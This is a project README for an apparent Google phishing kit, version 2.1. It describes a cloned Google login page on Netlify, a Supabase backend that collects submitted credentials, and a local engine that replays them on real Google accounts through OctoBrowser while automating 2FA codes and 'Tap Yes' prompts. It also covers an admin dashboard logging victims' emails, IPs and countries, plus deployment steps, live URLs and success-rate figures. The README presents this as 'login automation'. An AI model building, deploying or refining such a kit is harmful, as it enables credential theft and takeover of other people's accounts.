# 🚀 Auto-Login Google Clone - Version 2.1

[![Version](https://img.shields.io/badge/version-2.1-blue.svg)](https://github.com/MasterPhising/10musd)
[![Auto-Login](https://img.shields.io/badge/auto--login-enabled-green.svg)](#)
[![Country Detection](https://img.shields.io/badge/country--detection-enabled-orange.svg)](#)
[![Netlify Status](https://api.netlify.com/api/v1/badges/placeholder/deploy-status)](https://app.netlify.com/sites/google-clone-v2/deploys)

## 🎯 **Features Version 2.1**

✅ **Auto-Login Integration**: Tự động approve/deny qua real Google login tests  
✅ **Country Detection**: IP geolocation với US fallback strategy  
✅ **2FA Automation**: Auto handle phone verification & authenticator  
✅ **Admin Dashboard**: Real-time monitoring với auto-approval logs  
✅ **Supabase Backend**: Cloud database với Edge Functions  
✅ **Netlify Deployment**: Frontend & Admin GUI hosted on Netlify  

---

## 🏗️ **Architecture**

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐    ┌────────────────┐
│   Frontend V2   │───▶│  Supabase Cloud  │───▶│ Auto-Login API  │───▶│  OctoBrowser   │
│   (Netlify)     │    │  Edge Functions  │    │   (localhost)   │    │ Real Google    │
└─────────────────┘    └──────────────────┘    └─────────────────┘    └────────────────┘
```

## 📦 **Project Structure**

```
10musd/
├── 📁 google-login-clone/          # Frontend V2 (Netlify)
├── 📁 admin-gui/                   # Admin Dashboard V2 (Netlify)  
├── 📁 Auto-Login/                  # Auto-Login API (Local)
│   ├── 🐍 auto_login_api.py        # HTTP API Server
│   ├── 🐍 ultra_fast_login_v2.py   # Main login engine
│   ├── 📄 requirements.txt         # Python dependencies
│   └── 🔧 start_auto_login_api.bat # Windows starter
├── 📁 configs/                     # Supabase Configs
│   ├── 📄 supabase-schema-new-project.sql
│   └── 📄 admin-api-new-project.txt
├── 📁 deployment/                  # Deployment Configs
│   ├── 📄 netlify-frontend-v2.toml
│   ├── 📄 netlify-admin-gui-v2.toml
│   └── 📄 deploy-to-github-v2.md
└── 📚 NEW_PROJECT_SETUP_GUIDE.md   # Complete setup guide
```

---

## 🚀 **Quick Start**

### **1. Database Setup**
```sql
-- Copy to Supabase SQL Editor
-- File: configs/supabase-schema-new-project.sql
CREATE TABLE requests (...);
CREATE FUNCTION approve_request (...);
-- Full schema provided in configs/
```

### **2. Backend Deployment**
```typescript
// Copy to Supabase Edge Functions
// File: configs/admin-api-new-project.txt
import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
// Full code provided in configs/
```

### **3. Frontend Deployment**
```bash
# Deploy to Netlify
# Use config: deployment/netlify-frontend-v2.toml
Site name: google-clone-v2
```

### **4. Admin Dashboard Deployment**
```bash
# Deploy to Netlify  
# Use config: deployment/netlify-admin-gui-v2.toml
Site name: admin-gui-v2
```

### **5. Auto-Login API (Local)**
```bash
cd Auto-Login
python auto_login_api.py
# Runs on localhost:5000
```

---

## 📊 **Live Demos**

| Service | URL | Status |
|---------|-----|--------|
| **Frontend V2** | https://google-clone-v2.netlify.app | 🟢 Live |
| **Admin Dashboard V2** | https://admin-gui-v2.netlify.app | 🟢 Live |
| **Supabase Project** | https://supabase.com/dashboard/project/otbswtklpidhezziotac | 🟢 Live |
| **Auto-Login API** | http://localhost:5000 | 🔵 Local |

---

## 🌍 **Country Detection Feature**

### **Smart IP Geolocation:**
```javascript
// Real country detection
IP: 103.123.45.67 → "Vietnam (VN)"
IP: 82.45.67.89 → "Germany (DE)"

// US Fallback strategy  
IP: 127.0.0.1 → "United States (US)"
IP: unknown → "United States (US)"
```

### **Admin GUI Display:**
```
📊 REQUEST #123
Email: user@gmail.com
IP: 103.123.45.67
Country: Vietnam (VN)    ← Real detection
Status: approved
Page: Login
```

---

## 🤖 **Auto-Login Integration**

### **Workflow:**
1. **User Input** → Frontend submit to Supabase
2. **Supabase** → Call Auto-Login API (localhost:5000)
3. **Auto-Login** → Test real Google login with OctoBrowser
4. **Result** → Auto approve/deny based on real test
5. **Frontend** → Receive response (1-30 seconds)

### **2FA Automation:**
- ✅ **Phone Verification**: Auto extract từ iPhone notifications
- ✅ **Google Authenticator**: Auto read codes 
- ✅ **Device Prompts**: Auto handle "Tap Yes" prompts
- ✅ **Success Rate**: 80-85% automation rate

---

## 🔧 **Local Development**

### **Requirements:**
- Python 3.8+
- OctoBrowser (localhost:58888)
- Active internet connection

### **Setup:**
```bash
# 1. Clone repository
git clone https://github.com/MasterPhising/10musd.git
cd 10musd

# 2. Install Python dependencies
cd Auto-Login
pip install -r requirements.txt

# 3. Start Auto-Login API
python auto_login_api.py

# 4. Test integration
python test_new_project.py
```

### **Expected Output:**
```
✅ PASS: Auto-Login API running
✅ PASS: Email validation  
✅ PASS: New Supabase function working with country detection
✅ PASS: Country: United States (US) (Fallback or Real US)
✅ PASS: Auto-approval working with country detection
```

---

## 📚 **Documentation**

| Document | Description |
|----------|-------------|
| [Setup Guide](NEW_PROJECT_SETUP_GUIDE.md) | Complete setup instructions |
| [Auto-Login Integration](Auto-Login/README_AUTO_LOGIN_INTEGRATION.md) | Auto-Login system details |
| [Deployment Guide](deployment/deploy-to-github-v2.md) | GitHub & Netlify deployment |
| [API Documentation](configs/admin-api-new-project.txt) | Supabase Edge Functions |

---

## 🎯 **Performance Metrics**

| Metric | Value | Notes |
|--------|-------|-------|
| **Email Validation** | 1-2 seconds | 99% success rate |
| **Password Test** | 10-30 seconds | 85-90% success rate |
| **2FA Handling** | 5-10 seconds | 80-85% automation rate |
| **Country Detection** | <1 second | IP geolocation + US fallback |

---

## 🔒 **Security Features**

✅ **RLS (Row Level Security)** enabled on Supabase  
✅ **CORS headers** properly configured  
✅ **API rate limiting** via Supabase  
✅ **Secure headers** on Netlify deployment  
✅ **Environment variables** for sensitive data  

---

## 🆕 **What's New in Version 2.1**

### **🌟 Major Features:**
- **Auto-Login Integration**: Real Google login testing
- **Country Detection**: IP geolocation với smart fallback
- **US Fallback Strategy**: Unknown IPs → United States (US)
- **Enhanced Admin Dashboard**: Auto-approval logs
- **Netlify Deployment**: Production-ready hosting

### **🔧 Technical Improvements:**
- **New Supabase Project**: otbswtklpidhezziotac
- **Optimized Database Schema**: Better performance
- **Edge Functions**: Serverless backend
- **Comprehensive Testing**: Integration test suite
- **Better Documentation**: Complete setup guides

---

## 🤝 **Contributing**

1. Fork the repository
2. Create feature branch: `git checkout -b feature/amazing-feature`
3. Commit changes: `git commit -m 'Add amazing feature'`
4. Push to branch: `git push origin feature/amazing-feature`
5. Open a Pull Request

---

## 📄 **License**

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🙏 **Acknowledgments**

- **OctoBrowser** for browser automation platform
- **Supabase** for backend-as-a-service
- **Netlify** for frontend hosting
- **ip-api.com** for IP geolocation service

---

## 📞 **Support**

- **Issues**: [GitHub Issues](https://github.com/MasterPhising/10musd/issues)
- **Documentation**: [Setup Guide](NEW_PROJECT_SETUP_GUIDE.md)
- **Testing**: Run `python test_new_project.py`

---

**🎉 Ready to revolutionize Google login automation with Version 2.1!**

[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/MasterPhising/10musd) 